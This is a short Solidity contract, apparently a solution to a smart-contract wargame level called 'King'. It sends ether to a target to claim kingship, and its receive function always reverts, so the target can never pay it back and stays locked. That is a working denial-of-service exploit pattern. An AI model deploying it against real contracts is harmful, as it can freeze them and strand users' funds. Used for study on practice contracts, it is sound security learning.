// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingHack {

    address target;

    constructor(address _target) {
        target = _target;
    }

    function claimKingship() public payable {

        (bool succ, ) = target.call{ value: msg.value }("");
        
        require(succ);
    }

    receive() external payable {
        revert();
    }

}